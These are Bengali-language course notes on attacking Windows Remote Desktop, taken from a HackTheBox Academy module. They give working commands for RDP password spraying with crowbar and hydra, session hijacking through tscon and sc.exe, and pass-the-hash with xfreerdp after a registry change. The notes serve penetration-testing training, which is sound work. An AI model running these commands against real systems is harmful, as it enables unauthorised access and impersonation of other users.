# Attacking RDP - [LINK](https://academy.hackthebox.com/app/module/116/section/1171)

## 1. RDP কী?

Remote Desktop Protocol (RDP) হলো Microsoft-এর proprietary protocol, যা network-এর মাধ্যমে অন্য Windows computer-এর GUI remotely access করতে দেয়।

- Default port: TCP/3389
- ব্যবহার: Remote administration ও system management
- ঝুঁকি: দুর্বল credentials, misconfiguration ও session hijacking।

### RDP শনাক্ত করা

```
nmap -Pn -p3389 192.168.2.143
```

`-Pn` host discovery skip করে।

## 2. Misconfigurations ও Password Spraying

RDP-তে password guessing-এর ঝুঁকি থাকে। বারবার ভুল login করলে account lockout হতে পারে।

Password Spraying: অনেক username-এর বিরুদ্ধে একটি password চেষ্টা করা, তারপর প্রয়োজনে অন্য password ব্যবহার করা।

### Crowbar

```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

- `-b rdp`: RDP service
- `-s`: Target IP/network
- `-U`: Username list
- `-c`: নির্দিষ্ট password

### Hydra

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

- `-L`: Username list
- `-p`: একটি password
- `rdp`: Target service

RDP server অতিরিক্ত concurrent connection পছন্দ নাও করতে পারে; Hydra-এর output-এ `-t 1` বা `-t 4` ব্যবহার করার পরামর্শ রয়েছে।

সতর্কতা: শুধু অনুমোদিত lab বা assessment-এ password testing করবে।

## 3. RDP Login

Valid credentials থাকলে `rdesktop` বা `xfreerdp` দিয়ে GUI session খোলা যায়।

```
rdesktop -u admin -p 'password123' 192.168.2.143
```

Certificate warning এলে certificate-এর identity ও validity যাচাই করা উচিত।

## 4. RDP Session Hijacking

কোনো machine-এ local administrator access থাকলে এবং অন্য user-এর RDP session active থাকলে, নির্দিষ্ট পরিস্থিতিতে সেই session hijack করা সম্ভব হতে পারে।

- প্রয়োজন: `SYSTEM` privileges
- Tool: `tscon.exe`
- উদ্দেশ্য: অন্য session-এ connect করা
- ঝুঁকি: অন্য user-এর identity ও permissions ব্যবহার করা সম্ভব হতে পারে।

### Active Session দেখা

```
query user
```

### `tscon` Syntax

```
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```

Source-এর উদাহরণে session hijacking-এর জন্য Windows service ব্যবহার করা হয়েছে:

```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

net start sessionhijack
```

এখানে `sc.exe` দিয়ে service তৈরি ও চালু করা হয়; service সাধারণত Local System context-এ চলে।

Note: HTB source অনুযায়ী, এই নির্দিষ্ট পদ্ধতি Windows Server 2019-এ আর কাজ করে না।

References: [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon?utm_source=chatgpt.com) | [sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create?utm_source=chatgpt.com)

## 5. RDP Pass-the-Hash (PtH)

Pass-the-Hash (PtH) হলো plaintext password না জেনেও NT hash ব্যবহার করে authentication করার কৌশল।

RDP-এর মাধ্যমে GUI access দরকার হলে `xfreerdp`-এর `/pth` option ব্যবহার করা যেতে পারে—যদি target ও account configuration সমর্থন করে।

### Restricted Admin Mode

Source অনুযায়ী, RDP PtH-এর জন্য target-এ Restricted Admin Mode enabled থাকা প্রয়োজন।

Registry path:

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
```

Registry value:

- Name: `DisableRestrictedAdmin`
- Type: `REG_DWORD`
- Value: `0`

Source-এর command:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### `xfreerdp` দিয়ে PtH

```
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<NT_HASH>
```

- `/v`: Target host
- `/u`: Username
- `/pth`: NT hash

এটি সব Windows system-এ কাজ করবে না। RDP permission, Windows configuration এবং security policy-এর ওপর নির্ভর করে।
